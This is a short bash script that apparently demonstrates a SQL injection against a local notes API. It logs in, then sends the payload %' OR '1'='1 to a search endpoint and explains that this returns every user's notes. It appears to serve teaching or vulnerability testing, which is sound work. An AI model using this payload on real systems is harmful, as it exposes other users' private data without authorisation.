#!/bin/bash

BASE_URL="http://127.0.0.1:8000/api"

echo "=== SQL INJECTION DEMONSTRATION ==="
echo ""

# Login first
echo "Logging in..."
LOGIN_RESPONSE=$(curl -s -X POST "$BASE_URL/login" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@test.com","password":"123456"}')

TOKEN=$(echo $LOGIN_RESPONSE | jq -r '.token')

echo "Testing SQL Injection payload: %' OR '1'='1"
echo "This modifies the SQL query to: SELECT * FROM notes WHERE body LIKE '%%' OR '1'='1%'"
echo "The 'OR 1=1' makes the query return ALL notes from ALL users!"
echo ""

curl -s -X GET "$BASE_URL/search?keyword=%' OR '1'='1" \
  -H "Authorization: Bearer $TOKEN" | jq '.'

echo ""
echo "Notice: You can see notes that don't belong to you!"